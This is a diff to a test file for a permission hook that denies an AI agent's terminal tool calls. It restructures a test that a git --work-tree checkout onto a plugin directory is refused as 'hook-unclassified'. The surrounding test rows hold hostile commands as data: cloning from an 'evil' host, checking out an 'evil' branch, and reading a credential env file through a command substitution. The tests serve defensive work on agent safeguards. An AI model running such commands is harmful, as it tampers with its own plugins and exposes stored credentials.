@@ -430,7 +430,6 @@ test("refuter round 1 through the hook: substitutions, braces, downloads, git, a
     { tool: "terminal", input: { command: "git apply /tmp/p.diff", workdir: install } },
     { tool: "terminal", input: { command: "git reset --hard origin/evil", workdir: install } },
     { tool: "terminal", input: { command: `cd ${install} && git checkout evil`, workdir: workspace } },
-    { tool: "terminal", input: { command: `git --work-tree=${plugin} checkout x -- .`, workdir: workspace } },
     { tool: "terminal", input: { command: "git clone https://example.com/evil evil", workdir: join(home, "plugins") } },
     { tool: "terminal", input: { command: "npm install", workdir: install } },
     // S3
@@ -451,6 +450,16 @@ test("refuter round 1 through the hook: substitutions, braces, downloads, git, a
       classesOf(run).includes("policy.core") || classesOf(run).includes("account.credential"),
       `${JSON.stringify(row.input)}: ${verdict.message}`,
     );
+  }
+  // A `--work-tree=` onto an organ is still refused; since APRV-520 (#651) the
+  // classifier leaves an `=`-joined git global unclassified, so the refusal is
+  // `hook-unclassified` before the disk pass's `policy.core` is reached.
+  {
+    const row: Row = { tool: "terminal", input: { command: `git --work-tree=${plugin} checkout x -- .`, workdir: workspace } };
+    const run = ask(dir, row);
+    const verdict = verdictOf(run);
+    assert.equal(verdict.permission, "deny", `${JSON.stringify(row.input)}: ${run.stdout}`);
+    assert.match(verdict.message, /hook-unclassified/u, `${JSON.stringify(row.input)}: ${verdict.message}`);
   }
   for (const row of [
     { tool: "terminal", input: { command: "cat $(echo ~/.hermes)/.op.env", workdir: workspace }, env },
